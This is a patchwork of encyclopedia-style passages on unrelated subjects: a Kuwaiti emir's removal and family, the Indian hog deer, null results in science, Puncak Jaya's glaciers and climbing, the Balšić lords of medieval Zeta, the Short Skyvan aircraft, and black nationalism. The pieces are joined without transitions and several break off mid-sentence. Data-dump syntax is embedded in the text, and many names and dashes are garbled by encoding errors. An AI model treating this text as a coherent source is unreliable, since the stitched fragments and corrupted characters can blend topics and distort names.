Al-Ahmad Al-Jaber Al- Sabah. On 24 January 2006, the Kuwaiti parliament voted Saad out of office, moments before an official letter of abdication was received. The Kuwait Cabinet nominated the Prime Minister Sheikh Sabah Al-Ahmad Al-Sabah to take over as Emir as expected.PM set to become new Kuwait emir; CNN, 24 January 2006.

It was established in 1969 and named after Sheikh Saad. Personal life Married to his cousin, Sheikha Latifa Fahad Al- Sabah, Sheikh Saad had five daughters, Maryam, Hessa, Jamayel, Sheikha and Fadya, and one son, Fahad. One of his daughters, Sheika, controlled international marketing at Kuwait Petroleum Corporation (KPC). Until late August 1998, she was the executive assistant managing director for international marketing at the body. Another daughter, Hessa, was elected as vice-president of the Arab-Italian chamber of commerce in October 2012. She is also the head of the Arab women's business council and representative of Kuwait in the Chamber's general assembly session.

It also occurs in western Thailand and southwestern Yunnan Province in China. Introduced populations exist in AustraliaBentley, A (1967), An Introduction to the Deer of Australia.Mayze, R.J. and Moore, G.I. (1990). The Hog Deer. Australian Deer Research Foundation. and Sri Lanka. It gets its name from the hog-like manner in which it runs through the forests with its head hung low so that it can duck under obstacles instead of leaping over them like most other deer. It hides as soon as feasible with the tail held erect, showing the white underside. Description Young hog deer male in Assam A mature hog deer stag stands about 70 cm at the shoulder and weighs approximately 50 kg while hinds are much smaller, standing about 61 cm and weighing in the vicinity of 30 kg. They are very solidly built with a long body and relatively short legs and the line of the back slopes upward from the shoulders to a high rump. The ears are rounded; older animals tend to become light coloured in the face and neck. Female suckling fawn in Kaziranga, India The Indian hog deer's coat is quite thick and generally a uniform dark-brown in winter, except for the underparts of the body and legs, which are lighter in colour. During late spring, the change to a summer coat of rich reddish brown commences although this may vary between individuals. Many hog deer show a dark dorsal stripe extending from the head down the back of the neck and along the spine. In summer, there is usually a uniform row of light-coloured spots along either side of the dorsal stripe from the shoulders to the rump. The tail is fairly short and brown but tipped with white. The underside of the tail is white and the deer can fan the white hairs out in a distinctive alarm display. Indian hog deer have preorbital glands on the face just below the eyes and metatarsal glands located high on the side of the rear legs. Pedal glands are located between the cleaves or toes of the hind hooves. The antler of a mature hog deer stag is typically three tined-brow tine with solid main beam terminating in inner and outer top tines. However, antlers with more points are not uncommon. The distinctive features of typical hog deer antlers are the acute angle between the brow tine and main beam and the fact that the inner tops tend to be short and angle back from the main beam and across towards the opposite antler. Behaviour This species of deer are gregarious only when conditions are favorable and do not form a \\"unit\\" at these times, fleeing in different directions rather than in a herd. When alarmed, hog deer make a whistling vocalization or a warning bark. Home ranges vary widely in size, but average about 0.70 km¬≤. Males are aggressive, and may become territorial at low population densities, marking the boundaries with glandular secretions. During the rut, males gather in open meadows, pawing the ground during antagonistic encounters. Harems are not created, with males courting and defending a single female at any given time. Unlike many other deer species, hog deer do not have a rutting call. Population densities may be as low as 0.1 animals per square kilometer in riverine valleys, rising to over 19 individuals per square kilometer in grassy flood plains. Predators Predators include tigers, leopards, dholes and sometimes the Burmese python, and the clouded leopard.Grassman Jr., L. I.,Tewes, M. E., Silvy, N. J., Kreetiyutanont, K. (2005). Ecology of three sympatric felids in a mixed evergreen forest in North-central Thailand. Journal of Mammalogy 86: 29‚Äì38. Punjab, Pakistan Relatives There are two separate but similar island hog deer species: The Bawean deer (H. kuhlii) of Bawean Island in Indonesia, and the Calamian deer (H. calamianensis) of the Calamian Islands in the Philippines that inhabit moist or dry tropical deciduous forest environments. Unlike the best known western populations of the hog deer (A. porcinus), their fawns are not spotted at birth. However, the eastern populations (perhaps equalling the subspecies A. p. annamiticus) of the hog deer also have unspotted fawn. The two island hog deer may be remnants of a widespread population of hog deer that at one time were connected to the hog deer populations of mainland Southeast Asia and inhabited vast areas of the Sunda Shelf during times of lower ocean levels. Traditionally there have been two classified subspecies of hog deer: Indian hog deer (Hyelaphus porcinus porcinus) and the Indochinese hog deer (Hyelaphus porcinus annamiticus). However recent morphological studies indicate they are better off as two separate species.Ungulate Taxonomy ‚Äì A new perspective from Groves and Grubb (2011) . ultimateungulate.com thumb  Gallery  File:Hog Deer in Manas National Park 01.jpgHog deer in Manas National Park File:Hog deer Kaziranga TR AJTJ DSCN4886 v1.JPGHog deer in Kaziranga Tiger Reserve File:Indian hog deer (Hyelaphus porcinus).jpgIndian hog deer in Orang, Assam File:Indian hog deer in Assam India.jpgHog deer in Assam References Cervines Mammals of Asia Mammals of India Mammals of Pakistan Mammals of Southeast Asia Mammals of Thailand Introduced mammals of Australia Mammals described in 1780 Taxa named by Eberhard August Wilhelm von Zimmermann ","title":"Indian hog deer"},{"id":"30875775","text":"In science, a null result is a result without the expected content: that is, the proposed result is absent. It is an experimental outcome which does not show an otherwise expected effect. This does not imply a result of zero or nothing, simply a result that does not support the hypothesis. In statistical hypothesis testing, a null result occurs when an experimental result is not significantly different from what is to be expected under the null hypothesis; its probability (under the null hypothesis) does not exceed the significance level, i.e., the threshold set prior to testing for rejection of the null hypothesis. The significance level varies, but is often set at p-value 0.05 (5%). As an example in physics, the results of the Michelson‚ÄìMorley experiment were of this type, as it did not detect the expected velocity relative to the postulated luminiferous aether. This experiment's famous failed detection, commonly referred to as the null result, contributed to the development of special relativity. The experiment did appear to measure a non-zero \\"drift\\", but the value was far too small to account for the theoretically expected results; it is generally thought to be inside the noise level of the experiment.

History  = European Discovery = The highlands surrounding the peak were inhabited before European contact, and the peak was known as Nemangkawi in Amungkal. Puncak Jaya was named \\"Carstensz Pyramid\\" after Dutch explorer Jan Carstenszoon, who was the first European who sighted the glaciers on the peak of the mountain on a rare clear day in 1623. The sighting went unverified for over two centuries, and Carstensz was ridiculed in Europe when he said he had seen snow near the equator. The snowfield of Puncak Trikora, east of here, was reached as early as 1909 by a Dutch explorer, Hendrik Albert Lorentz with six of his Dayak Kenyah porters recruited from the Apo Kayan in Borneo.Lorentz, H.A., 1910.

Because of extensive snow melt Ngga Pulu has become a subsidiary peak, but it has been estimated that in 1936 (when glaciers still covered of the mountain; see map) Ngga Pulu was indeed the highest summit, reaching over .Interview with Jean Jacques Dozy in 2002 (in Dutch). The now-highest Carstensz Pyramid summit was not climbed until 1962, by an expedition led by the Austrian mountaineer Heinrich Harrer (of Seven Years in Tibet fame, and climber of the Eiger North Face) with three other expedition members ‚Äì the New Zealand mountaineer Philip Temple, the Australian rock climber Russell Kippax, and the Dutch patrol officer Albertus (Bert) Huizenga. Temple had previously led an expedition into the area and pioneered the access route to the mountains.Philip Temple Account of first ascent When Indonesia took control of the province in 1963, the peak was renamed 'Poentja Soekarno' (Simplified Indonesian: Puncak Sukarno) or Sukarno Peak, after the first President of Indonesia; later this was changed to Puncak Jaya. Puncak means peak or mountain and Jaya means 'victory', 'victorious' or 'glorious'. The name Carstensz Pyramid is still used among mountaineers.  Geology  Puncak Jaya is the highest point on the central range, which was created in the late Miocene Melanesian orogeny, caused by oblique collision between the Australian and Pacific plates and is made of middle Miocene limestones.  Access  Access to the peak requires a government permit. The mountain was closed to tourists and climbers between 1995 and 2005. As of 2006, access is possible through various adventure tourism agencies.  Glaciers  Puncak Jaya icecap 1936 Puncak Jaya icecap 1972 While Puncak Jaya's peak is free of ice, there are several glaciers on its slopes, including the Carstensz Glacier, West Northwall Firn, East Northwall Firn and the recently vanished Meren Glacier in the Meren Valley (meren is Dutch for \\"lakes\\"). Being equatorial, there is little variation in the mean temperature during the year (around ) and the glaciers fluctuate on a seasonal basis only slightly. However, analysis of the extent of these rare equatorial glaciers from historical records show significant retreat since the 1850s, around the time of the Little Ice Age Maximum which primarily affected the Northern Hemisphere, indicating a regional warming of around per century between 1850 and 1972. The glacier on Puncak Trikora in the Maoke Mountains disappeared completely some time between 1939 and 1962. Since the 1970s, evidence from satellite imagery indicates the Puncak Jaya glaciers have been retreating rapidly. The Meren Glacier melted away sometime between 1994 and 2000. An expedition led by paleoclimatologist Lonnie Thompson in 2010 found that the glaciers are disappearing at a rate of thickness per year and in 2018 they were predicted to vanish in the 2020s. Disappearance of glaciers from Puncak Jaya, 1984‚Äì2020  Climbing  The highland area in 2005, with the Grasberg copper mine pit in the foreground. Its summit is at the far end of the central rib. Puncak Jaya is one of the more demanding climbs in one version of the Seven Summits, despite having the lowest elevation. It is held to have the highest technical rating, though not the greatest physical demands of that list's ascents. The standard route to climb the peak from its base camp is up the north face and along the summit ridge, which is all hard rock surface. Despite the large mine, the area is highly inaccessible to hikers and the general public. The standard route to access base camp as of 2013 is to fly into the nearest major town with an airport, Timika, and then take a small aircraft over the mountain range and onto an unimproved runway at one of the local villages far down from the peak. It is then typically a five-day hike via the Jungle route to the base camp through very dense jungle and with regular rainfall, making the approach probably the \\"most miserable\\" of the Seven Summits. Rain during most days of the hike inbound and out are not uncommon. Unlike the other Seven Summits, if one sustains an injury on the inbound hike, there is little or no ability to get rescued via helicopter. Anyone injured must evacuate by foot over very difficult and slippery terrain. The descent from the peak's base camp can take three to four days. Anecdotally, it appears most injuries occur during the descent due to a combination of exhaustion and difficulty controlling hiking speed on the wet and slippery terrain. An additional complication is relatively common work strikes by the climbing porters that accompany most expeditions, occasionally halting their work to demand (and usually receive) higher pay before agreeing to continue. The one-day summit bid is technically challenging for those with little rock climbing experience, and it can be quite cold with temperatures at or below freezing near the summit. Patches of snow sometimes appear on the route up or on the ropes of the Tyrolean traverse just below the summit.

In the mid-14th century, Zeta was divided into Upper and Lower Zeta, governed by magnates. After Stefan Du≈°an (r. 1331‚Äì55), his son Stefan Uro≈° V ruled Serbia during the fall of the Serbian Empire; a gradual disintegration of the Empire as a result of decentralization in which provincial lords gained semi-autonomy and eventually independence. The Bal≈°iƒái wrestled the Zeta region in 1356-62, when they removed the two rulers in Upper and Lower Zeta. Ruling as lords, they empowered themselves and over the decades became an important player in Balkan politics. Zeta was united into the Serbian Despotate in 1421, after Bal≈°a III abdicated and passed the rule to his uncle, Despot Stefan Lazareviƒá (maternally a Nemanjiƒá). Background Serbian Prince Desa Uro≈°eviƒá conquered Duklja and Travunia in 1148, combining the title as \\"Prince of Primorje\\" (the Maritime) and co-ruled Serbia with his brother Uro≈° II Prvoslav from 1149 to 1153, and alone until 1162. In 1190, Grand Prince Stefan Nemanja's son, Vukan Nemanjiƒá, asserted his right to the Dukljan crown. In 1219, the regent of Zeta and King Vukan's oldest son, ƒêorƒëe Nemanjiƒá, became king of Duklja/Zeta. He was succeeded by his second oldest son, Uro≈° I, who built the 'Uspenje Bogorodice' monastery in Moraƒça. Between 1276 and 1309, Zeta was ruled by Queen Jelena, widow of King Stefan Uro≈° I. She restored around 50 monasteries in the region, most notably Saint Srƒë and Vakh on the Bojana River. The name Crna Gora (Montenegro) was formally mentioned for the first time in 1296, by Stefan Milutin (son of Uro≈° I) in the charter of St. Nicholas' monastery in Vranjina, to denote the highland region under Mount Lovƒáen, within the confines of Zeta. From 1309 to 1321, Zeta was co-ruled by the oldest son of King Milutin, Young King Stefan Deƒçanski. Similarly, from 1321 to 1331, Stefan's young son Stefan Du≈°an, the future Serbian King and Emperor, co-ruled Zeta with his father. Du≈°an \\"the Mighty\\" was crowned Emperor in 1331, and ruled until his death in 1355. Stefan Uro≈° V, \\"the Weak\\" succeeded him, his epithet was given due to his weak rule of the Empire. Later ≈Ωarko held the Lower Zeta region: he is mentioned in records from 1356, when he raided some Ragusan merchants, not far from Sveti Srƒë at Lake Skadar. Zeta itself was held by the widow of Du≈°an, Jelena, who at the time was in Serres where she had her court. The next year, in June, ≈Ωarko became a citizen of the Republic of Venice, where he was known as \\"baron lord of the Serbian King, with holdings in the Zeta region and Bojana of the maritime\\". According to Mavro Orbini (1601), the Bal≈°iƒá family started to expand in Lower Zeta after the death of Emperor Du≈°an, during the weak rule of Emperor Uro≈° V. In 1360 they held a part of the land between Lake Skadar and the Adriatic Sea. The Bal≈°iƒá brothers continued into Upper Zeta, which was held by ƒêura≈° Ilijiƒá and his relatives, and killed ƒêura≈° and had some of his relatives captured while the rest left the land, \\"and thus also ruled Upper Zeta\\". This took place after 1362. History States in the Central Balkans (including Realm of Zeta of the House of Bal≈°iƒá) in the 14th centuryThe earliest State of BalsicUpper and Lower Zeta =Founding= The Bal≈°iƒái are mentioned in a charter issued in 1360 to the Republic of Ragusa by Emperor Stefan Uro≈° V, as provincial lords in the Zeta region. According to Mavro Orbin (l. 1563‚Äì1614), 'A poor Lord Bal≈°a', said to be 'kin to Nemanja' held only a village located between the Adriatic and Bojana river during the rule of Emperor Du≈°an (r. 1331‚Äì55) but after the death of the Emperor and following years under his son, Uro≈° V, by 1362 had taken over Lower Zeta, after removing vojvoda ƒêura≈° Ilijiƒá of Upper Zeta who had held the position since around 1326 (since Stefan Deƒçanski). Bal≈°a, together with his three sons Stracimir, ƒêuraƒë I and Bal≈°a II, conquered Upper Zeta and the towns of Skadar, Kotor and Bar. ƒêuraƒë I ruled until 1378 and Bal≈°a II until 1385. =ƒêuraƒë I= ƒêuraƒë's rule extended from around 1362 to 1378. He had forged an alliance with King Vuka≈°in Mrnjavƒçeviƒá, having married his daughter Olivera, until Mrnjavƒçeviƒá's fall at the Battle of Maritsa (1371). ƒêuraƒë I ran Zeta as a modern ruler of the time. Zeta's institutions were functioning well, while the coastal towns enjoyed considerable autonomy. Commerce was well developed and enhanced by the existence of Zeta's currency, the dinar. ƒêuraƒë I allied with his neighbors Prince Lazar Hrebeljanoviƒá of Serbia, Ban Tvrtko I Kotromaniƒá of Bosnia, Prince Nikola I Gorjanski and King Louis I of Hungary, to defeat the ambitious Nikola Altomanoviƒá in 1373. In spite of this, the defeated and blinded Altomanoviƒá found refuge in Zeta until his death. While he was battling in the south of Kosovo, ƒêuraƒë's younger brother Bal≈°a II married Komnina, a close cousin of Emperor Stefan Du≈°an's wife, Jelena. Through the marriage, ƒêuraƒë II received a generous dowry in land, including Avlona, Berat, Kanina, and some additional strategically important regions. Upon the division of Altomanoviƒá's lands (in Herzegovina), the Bal≈°iƒás took the towns of Trebinje, Konavle and Draƒçevica. Subsequent dispute over these towns led to a conflict between Zeta and Bosnia, led by Ban Tvrtko I. The fight was eventually won by Bosnia, supported by Hungary, after ƒêuraƒë's death in 1378. =Bal≈°a II= In 1378, following ƒêuraƒë's death, his brother Bal≈°a II became the King of Zeta. In 1382, King Tvrtko I conquered Draƒçevica, and built the town later known as Herceg-Novi. According to some documents, Bal≈°a was of Vlach originE.J. Brill's First Encyclopaedia of Islam, edited by M. Th. Houtsma, 1913-1936, Vol. 5, p.556. Both Tvrtko I and Bal≈°a II aspired to ascend to the throne of the Nemanjiƒá dynasty. During his rule, Bal≈°a II's could not maintain the control of the feudal lords as his predecessor did. His power was strong only in region around Skadar, and in the eastern part of Zeta. The most prominent feudal lords who did not recognize Bal≈°a's rule was the House of Crnojeviƒá, who were consistent encouraged by the Venetians to rebel against him. Bal≈°a II needed four attempts to conquer Draƒç, an important commercial and strategic center. Defeated, Karl Thopia appealed to the Turks for help. Turkish forces led by Hajrudin Pasha inflicted heavy damage to Bal≈°a II's forces and killed him at a major Battle of Savra near Lushnj√´, in 1385. =ƒêuraƒë II= The successor of Bal≈°a II, ƒêuraƒë II Stracimiroviƒá Bal≈°iƒá, ruled Zeta from 1385 to 1403; he was Bal≈°a's nephew and son of Stracimir. He also had difficulties controlling the local feudal lords, with no control over the fiefs of the entire Upper Zeta. In addition, the feudal lords around Onogo≈°t (Nik≈°iƒá) accepted the Venetian protection. The most prominent of those lords was Radiƒç Crnojeviƒá, who controlled the area between Budva and Mount Lovƒáen. Moreover, a number of Arbanas feudal lords, particularly Lek√´ Dukagjini and Paul Dukagjini joined the conspiracy against ƒêuraƒë II. With this in mind as well as the constant danger from the Turks, ƒêuraƒë II maintained strong family ties with the Serbia's main lord of the time, Prince Lazar. To help Prince Lazar defend the Serbian lands from Ottoman invasion, ƒêuraƒë II sent his troops along with Ban Tvrtko I Kotromaniƒá's forces (with whom he had a dispute over Kotor) to meet the Ottoman army at Kosovo Polje. Despite Sultan Murad I's death, the Serbian army suffered a defeat at the epic Battle of Kosovo in 1389. According to the sources, ƒêuraƒë II did not participate in the battle, being in Ulcinj in Southern Zeta. In later years, ƒêuraƒë II played skillful diplomatic games to enhance the rivalry between the Ottomans and the Venetians. To that purpose, he offered Skadar to both hoping that eventually he would be able to keep it. After two years of fighting, Turks and Venetians agreed to leave it to ƒêuraƒë II, who was neutral in the conflict. Similarly, the rivalry between Venetians and Hungarians brought a benefit to him. After a serious defeat of his forces by Turks near Nicopolis, the Hungarian King Sigismund gave him the title of Prince of Arbania and the control over the islands of Hvar and Korƒçula. In the feud between ƒêuraƒë Brankoviƒá and his uncle, Stefan Lazareviƒá (son of Prince Lazar), who later received the title of Byzantine Despot, ƒêuraƒë II sided with Stefan. Due to ƒêuraƒë's support, Stefan defeated Turkish forces led by ƒêuraƒë Brankoviƒá in the Battle of Tripolje on Kosovo Field in November 1402. =Bal≈°a III= In 1403, ƒêuraƒë II's 17-year-old son, Bal≈°a III, inherited the throne of Zeta after his father died as a consequence of the injuries he suffered in the Battle of Tripolje. As he was young and inexperienced, his main advisor was his mother Jelena, a sister of the Serbian ruler, Stefan Lazareviƒá. Under her influence, Bal≈°a III declared Orthodox Christianity as the official state religion; however, Catholicism was tolerated. Bal≈°a III continued the policies of his father. In 1418, took Skadar from the Venetians, but lost Budva. In the following year he made an unsuccessful attempt to recapture Budva. Afterwards he went to Belgrade to ask for help from Despot Stefan, but never returned to Zeta. Aftermath In 1421, before his death and under the influence of his mother Jelena, Bal≈°a III passed the rule of Zeta to Despot Stefan Lazareviƒá. He fought Venetians and regained Bar in mid-1423, and in the following year he sent his nephew ƒêuraƒë Brankoviƒá, who regaining Drivast and Ulcinium (Ulcinj).

It is used mainly for short-haul freight and skydiving. The Short 330 and Short 360 are stretched models of the original SC.7, designed as regional airliners. Design and development In 1958, Short was approached by F.G. Miles Ltd (successor company to Miles Aircraft) which was seeking backing to produce a development of the H.D.M.106 Caravan design with a high aspect ratio wing similar to that of the Hurel-Dubois HD.31. Short acquired the design and data gathered from trials of the Miles Aerovan based H.D.M.105 prototype. After evaluating the Miles proposal, Short rejected the Caravan. They developed their own design for a utility all-metal aircraft which was called the Short SC.7 Skyvan. The Skyvan is a twin-engined all-metal, high- wing monoplane, with a braced, high aspect ratio wing, and an unpressurised, square-section fuselage with twin fins and rudders. It was popular with freight operators compared to other small aircraft because of its large rear door for loading and unloading freight. Its fuselage resembles the shape of a railroad boxcar for simplicity and efficiency. Skyvan 3 converted for survey work by Questor Surveys, 1975 Construction started at Sydenham Airport in 1960, and the first prototype first flew on 17 January 1963, powered by two Continental piston engines. Later in 1963, the prototype was re-engined with the intended Turbomeca Astazou II turboprop engines of 520eshp; the second prototype (the first Series 2 Skyvan) was initially fitted with Turbomeca Astazou X turboprop engines of 666eshp but subsequently the initial production version was powered by Turbomeca Astazou XII turboprop engines of 690eshp. In 1967, it was found that the Astazou XII was temperature limited at high altitudes. Consequently, in 1968, production switched to the Skyvan Series 3 aircraft, which replaced the Astazou engines with Garrett AiResearch TPE331 turboprops of 715eshp. A total of 149 Skyvans (including the two prototypes) was produced before production ended in 1986. Operational history Skyvans served widely in both military and civilian operations, and the type remained in service in 2009 with a number of civilian operators, and in military service in Guyana and Oman. SC.7 Skyvan at Oulu Airport Skyvans were used during the infamous death flights at the depths of Argentina's Dirty War in 1977, during which around 4,400 detainees were thrown to their deaths onto the R√≠o de la Plata. Two Argentine Naval Prefecture Skyvans later participated in the 1982 Falklands War. Both aircraft were ferried to Port Stanley in April 1982. One aircraft was damaged by British naval gunfire on Stanley racecourse, and did not fly again; it was finally destroyed by shellfire during British bombardments on 12/13 June 1982. The second aircraft was used at Pebble Island, where it became bogged down in the soft ground, and on 15 May 1982 it was destroyed by a British raiding party.Burden, Rodney et al.

Black nationalist activism revolves around social, political, and economic empowerment of black communities and people, especially to resist assimilation into white culture (through integration or otherwise) and maintain a distinct black identity. Black nationalism arose within the African American community in the United States. In the early 20th century, the Garveyism promoted by the U.S.-based Marcus Garvey furthered black nationalist ideas. Black nationalist ideas also proved an influence on the Black Islam movement, particularly groups like the Nation of Islam founded by Elijah Muhammad. During the 1960s, Black nationalism influenced the Black Panther Party and the broader Black Power movement. Early history Martin Delany (1812‚Äì1885), an African American abolitionist, was arguably the first proponent of black nationalism.Libraries.wvu.edu Inspired by the success of the Haitian Revolution, the origins of black and indigenous African nationalism in political thought lie in the 19th and early 20th centuries with people such as Marcus Garvey, Benjamin \\"Pap\\" Singleton, Henry McNeal Turner, Martin Delany, Henry Highland Garnet, Edward Wilmot Blyden, Paul Cuffe, and others. The repatriation of African-American slaves to Liberia or Sierra Leone was a common black nationalist theme in the 19th century. Marcus Garvey's Universal Negro Improvement Association of the 1910s and 1920s was the most powerful black nationalist movement to date, claiming millions of members. Garvey's movement was opposed by mainline black leaders, and crushed by government action. However, its many alumni remembered its inspiring rhetoric.William L. Van Deburg, ed., Modern Black Nationalism: From Marcus Garvey to Louis Farrakhan (1996). According to Wilson Jeremiah Moses, black nationalism as a philosophy can be examined from three different periods, giving rise to various ideological perspectives for what we can today consider black nationalism.Wilson Jeremiah Moses, Classical Black Nationalism (1996). The first period of pre-classical black nationalism began when the first Africans were brought to the Americas as slaves through the American Revolutionary period. The second period of black nationalism began after the Revolutionary War. This period refers to the time when a sizeable number of educated Africans within the colonies (specifically within New England and Pennsylvania) had become disgusted with the social conditions that arose out of the Enlightenment's ideas. From this way of thinking came the rise of individuals within the black community who sought to create organizations that would unite black people. The intention of these organizations was to group black people together so they could voice their concerns, and help their own community advance itself. This form of thinking can be found in historical personalities such as; Prince Hall, Richard Allen and Absalom Jones, James Forten, Cyrus Bustill, William Gray through their need to become founders of certain organizations such as African Masonic lodges, the Free African Society, and Church Institutions such as the African Episcopal Church of St. Thomas. These institutions served as early foundations to developing independent and separate organizations for their own people. The goal was to create groups to include those who so many times had been excluded from exclusively white communities and government-funded organizations. The third period of black nationalism arose during the post-Reconstruction era, particularly among various African-American clergy circles. Separated circles were already established and accepted because African-Americans had long endured the oppression of slavery and Jim Crowism in the United States since its inception. The clerical phenomenon led to the birth of a modern form of black nationalism that stressed the need to separate blacks from non-blacks and build separate communities that would promote racial pride and collectivize resources. The new ideology became the philosophy of groups like the Moorish Science Temple and the Nation of Islam. By 1930, Wallace Fard Muhammad had founded the Nation of Islam. His method to spread information about the Nation of Islam used unconventional tactics to recruit individuals in Detroit, Michigan. Later on, Elijah Muhammad would lead the Nation of Islam and become a mentor to people like Malcolm X. Although the 1960s brought a period of heightened religious, cultural and political nationalism, it was black nationalism that would lead the promotion of Afrocentrism. = Prince Hall = Prince Hall was an important social leader of Boston following the Revolutionary War. He is well known for his contribution as the founder of Black Freemasonry. His life and past are unclear, but he is believed to have been a former slave freed after twenty one years of slavehood. In 1775 fifteen other black men along with Hall joined a freemason lodge of British soldiers, after the departure of the soldiers they created their own lodge African Lodge #1 and were granted full stature in 1784. Despite their stature other white freemason lodges in America did not treat them equal and so Hall began to help other black Masonic lodges across the country to help their own cause - to progress as a community together despite any difficulties brought to them by racists. Hall was best recognized for his contribution to the black community along with his petitions (many denied) in the name of black nationalism. In 1787 he unsuccessfully petitioned to the Massachusetts legislature to send blacks back to Africa (to obtain \\"complete\\" freedom from white supremacy). In 1788, Hall was a well known contributor to the passing of the legislation of the outlawing of the slave-trade and those involved. Hall continued his efforts to help his community, and in 1796 his petition for Boston to approve funding for black schools. Despite the city's inability to provide a building, Hall lent his building for the school to run from. Until his death in 1807, Hall continued to work for black rights in issues of abolition, civil rights and the advancement of the community overall. Free African Society In 1787 Richard Allen and Absalom Jones, black ministers of Pennsylvania, formed the Free African Society of Pennsylvania. The goal of this organization was to create a church that was free of restrictions of only one form of religion, and to pave the way for the creation of a house of worship exclusive to their community. They were successful in doing this when they created the St. Thomas African Episcopal Church in 1793. The community included many members who were notably abolitionist men and former slaves. Allen, following his own beliefs that worship should be out loud and outspoken, left the organization two years later. With the re an opportunity to become the pastor to the church but rejected the offer leaving it to Jones. The society itself was a memorable charitable organization that allowed its members to socialize and network with other business partners, in attempt to better their community. Its activity and open doors served as a motivational growth for the city as many other black mutual aid societies in the city began to pop up. Additionally the society is well known for their aid during the yellow fever epidemic in 1793 known to have taken the life of many of the city. African Episcopal Church of St. Thomas in Philadelphia, Pennsylvania  The African Church or the African Episcopal Church of St. Thomas Philadelphia, Pennsylvania was founded in 1792 for those of African descent, as a foster church for the community with the goal to be interdenominational. In the beginning of the church's establishment its masses were held in homes and local schools. One of the founders of the Free African Society was also the first Episcopal priest of African American descent, Absalom Jones. The original church house was constructed at 5th and Adelphi Streets in Philadelphia, now St. James Place, and it was dedicated on July 17, 1794; other locations of the church included: 12th Street near Walnut, 57th and Pearl Streets, 52nd and Parrish Streets, and the current location, Overbrook and Lancaster Avenue in Philadelphia's historic Overbrook Farms neighborhood. The church is mostly African-American. The church and its members have played a key role in the abolition/anti- slavery and equal rights movement of the 1800s. \\"Since 1960 St. Thomas has been involved in the local and national civil rights movement through its work with the National Association for the Advancement of Colored People (NAACP), the Union of Black Episcopalians, the Opportunities Industrialization Center (OIC), Philadelphia Interfaith Action, and The Episcopal Church Women. Most importantly, it has been in the forefront of the movement to uphold the knowledge and value of the black presence in the Episcopal Church. Today, that tradition continues with a still-growing membership through a host of ministries such as Christian Formation, the Chancel Choir, Gospel Choir, Jazz Ensemble, Men‚Äôs Fellowship, Young Adult and Youth Ministries, a Church School, Health Ministry, Caring Ministry, and a Shepherding Program.\\"  Nation of Islam  Wallace D. Fard founded the Nation of Islam in the 1930s. Fard took as his student Elijah (Poole) Muhammad, who later became the leader of the organization. The basis of the group was the belief that Christianity was exclusively a White man's religion, while Islam was the way for black folk; Christianity was a religion that, like slavery itself, was forced upon the people who suffered at the hands of the whites during their enslavement. The beliefs of the members of the Nation of Islam are similar to others who follow the Quran and worship Allah under the religion of Islam. Founded on resentment of the way Whites historically treated people of color, the Nation of Islam embraces the ideas of black nationalism. The group itself has, since the leadership of Elijah Muhammad, recruited thousands of followers from all segments of society: from prisons, as well as from black pride and black nationalist movements. Members of the Nation of Islam preached that the goal was not to integrate into White American culture, but rather to create their own cultural footprint and their own separate community in order to obliterate oppression. Their aim was to have their own schools and churches and to support each other without any reliance on other racial groups. The members of the Nation of Islam are known as Black Muslims. As the group became more and more prominent with public figures such as Malcolm X as its orators, it received increasing attention from outsiders. In 1959 the group was the subject of a documentary named The Hate that Hate Produced. The documentary cast the organization in a negative light, depicting it as a black supremacy group. Even with such depictions, the group did not lose support from its people. When Elijah Muhammad died, his son took on the role as the leader of the Nation of Islam, converting the organization into a more orthodox iteration of Islam and abandoning beliefs that tended toward violence. This conversion prompted others to abandon the group, dissatisfied with the change in ideology. They created a \\"New\\" Nation of Islam in order to restore the aims of the original organization. The Southern Poverty Law Center classifies the Nation of Islam as a hate group, stating: \\"Its theology of innate black superiority over whites and the deeply racist, antisemitic and anti-LGBT rhetoric of its leaders have earned the NOI a prominent position in the ranks of organized hate.\\" Louis Farrakhan currently leads the group.  Elijah Muhammad  Elijah Muhammad was famously known as the successor of Wallace Fard, the founder of the Nation of Islam. He was born in Georgia on October 7, 1897. He led the group from 1934 to 1975, being very well recognized as one of the mentors to other famous leaders such as Malcolm X. He lived until February 25, 1975, in Chicago, and the leadership of the organization passed to his son. 20th century =Marcus Garvey= Marcus Garvey encouraged African people around the world to be proud of their race and see beauty in their own kind. This form of black nationalism later became known as Garveyism. A central idea to Garveyism was that African people in every part of the world were one people and they would never advance if they did not put aside their cultural and ethnic differences and unite under their own shared history. He was heavily influenced by the earlier works of Booker T. Washington, Martin Delany, and Henry McNeal Turner. Garvey used his own personal magnetism and the understanding of black psychology and the psychology of confrontation to create a movement that challenged bourgeois blacks for the minds and souls of African Americans. Marcus Garvey's return to America had to do with his desire to meet with the man who inspired him most, Booker T. Washington, however Garvey did not return in time to meet Washington. Despite this, Garvey moved forward with his efforts and two years later, a year after Washington's death, Garvey established a similar organization in America known as the United Negro Improvement Association otherwise known as the UNIA. Garvey's beliefs are articulated in The Philosophy and Opinions of Marcus Garvey as well as Message To The People: The Course of African Philosophy. =Malcolm X= Between 1953 and 1964, while most African leaders worked in the civil rights movement to integrate African-American people into mainstream American life, Malcolm X was an avid advocate of black independence and the reclaiming of black pride and masculinity. He maintained that there was hypocrisy in the purported values of Western culture ‚Äì from its Judeo-Christian religious traditions to American political and economic institutions ‚Äì and its inherently racist actions. He maintained that separatism and control of politics, and economics within its own community would serve blacks better than the tactics of civil rights leader Rev. Martin Luther King Jr. and mainstream civil rights groups such as the SCLC, SNCC, NAACP, and CORE. Malcolm X declared that nonviolence was the \\"philosophy of the fool,\\" and that to achieve anything, African Americans would have to reclaim their national identity, embrace the rights covered by the Second Amendment, and defend themselves from white hegemony and extrajudicial violence. In response to Rev. King's famous \\"I Have a Dream\\" speech, Malcolm X quipped, \\"While King was having a dream, the rest of us Negroes are having a nightmare.\\" Prior to his pilgrimage to Mecca, Malcolm X believed that African Americans must develop their own society and ethical values, including the self-help, community-based enterprises, that the black Muslims supported. He also thought that African Americans should reject integration or cooperation with whites until they could achieve internal cooperation and unity. He prophetically believed that there \\"would be bloodshed\\" if the racism problem in America remained ignored, and he renounced \\"compromise\\" with whites. In April 1964, Malcolm X participated in a Hajj (pilgrimage to Mecca); Malcolm found himself restructuring his views and recanted several extremist opinions during his shift to mainstream Islam. Malcolm X returned from Mecca with moderate views that included an abandonment of his commitment to racial separatism. However, he still supported black nationalism and advocated that African Americans in the United States act proactively in their campaign for equal human rights, instead of relying on Caucasian citizens to change the laws that govern society. The tenets of Malcolm X's new philosophy are articulated in the charter of his Organization of Afro-American Unity (a secular Pan-Africanist group patterned after the Organization of African Unity), and he inspired some aspects of the future Black Panther movement.Manning Marable, Malcolm X: A Life of Reinvention (2011). =Stokely Carmichael= In the 1967 Black Power, Stokely Carmichael introduces black nationalism. He 